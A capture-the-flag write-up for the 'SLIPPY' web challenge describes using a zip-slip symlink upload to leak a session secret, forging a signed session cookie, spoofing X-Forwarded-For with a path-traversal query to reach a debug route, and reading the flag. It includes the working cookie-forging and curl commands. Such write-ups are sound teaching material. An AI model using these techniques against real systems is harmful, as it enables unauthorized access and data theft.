# SLIPPY – 50 points – WEB (Baby)

**Author:** Sagi  
**Flavor text:** *Slipping Jimmy keeps playing with Finger.*

---

We are given a webpage `https://web-slippy-df9c4362a751a4a7.challs.tfcctf.com` that accepts zip file uploads, and lists em under `/files`.

---

## Dockerfile Clue

```dockerfile
RUN rand_dir="/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"; \
    mkdir "$rand_dir" && \
    echo "TFCCTF{Fake_fLag}" > "$rand_dir/flag.txt" && \
    chmod -R +r "$rand_dir"
```

Reading the Dockerfile I noticed the flag is always placed at `/random8/flag.txt`, but since the folder is randomized with 8 characters from `[a-z0-9]`, brute forcing (`36^8 ≈ 2.8 trillion`) is impossible.

---

## Vulnerability

After messing with file uploads a bit and some research, I found this was a **Zip Slip / symlink** vulnerability.  

I wrote and used `symlink_enum.py` to build a zip payload that let me enumerate the server. Uploading this, I could view some files (though `/proc/*` entries like mountinfo came back empty).  

- I added a time stamp to the payloads since i was messing with different ones and had a lot on my machine
- The instance with the server would timeout every 2 minutes making testing frustrating when crafting payloads, had to keep spinning up new ones between testing


---

## Useful Information Leaked

From `/app/.env`:

```
SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b
```

From `/app/server.js`:

```js
const sessionData = {
    cookie: {
      path: '/',
      httpOnly: true,
      maxAge: 1000 * 60 * 60 * 48 // 1 hour
    },
    userId: 'develop'
};
store.set('amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
});
```

This shows that a **develop** session is pre-seeded with a known SID.

---

## Forging the Cookie

With the SID and `SESSION_SECRET` I was able to forge a valid cookie using Node’s `cookie-signature`:

```bash
node -e "console.log(require('cookie-signature').sign(
  'amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E',
  '3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b'
))"
```

Output:

```
s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE
```

---

## Debug Route Abuse

There is a dev-only route `/debug/files`.  
It’s protected by:

```js
(req.session.userId === 'develop') && (req.ip === '127.0.0.1')
```

The forged cookie handles the session check. For the IP check, the app uses `trust proxy`, so we can spoof `X-Forwarded-For: 127.0.0.1`.

CURL:

```bash
curl -sSL \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE" \
  "https://web-slippy-463ad9a5dac5e550.challs.tfcctf.com/debug/files?session_id=../../.."
```

This lists the root `/`. One of the listed items `tlhedn6f` matched the randomization format from the Dockerfile:

```html
<li class="list-group-item">
  tlhedn6f
  <a href="/files/tlhedn6f" class="button">Download</a>
</li>
```

---

## Flag Access

Once I found the random folder (`tlhedn6f` here), I used the a symlink payload made by `symlink_flag.py` pointing to `/tlhedn6f/flag.txt`.  

Fetching it under `/files/tlhedn6f` outputs the flag.   

---

## Notes

- I first tried replacing cookies in the browser, but the dev middleware also checked `req.ip`, so it was easier to spoof via curl.  
- `/proc/*` files didn’t help since they stream empty with Express.  
- The real solve path is:  
  1. Use Zip Slip to read `.env` + `server.js`.  
  2. Extract `SESSION_SECRET` and SID.  
  3. Forge cookie.  
  4. Spoof IP → access `/debug/files`.  
  5. Spot random dir.  
  6. Symlink to `/random8/flag.txt`.  
  7. Download flag.

---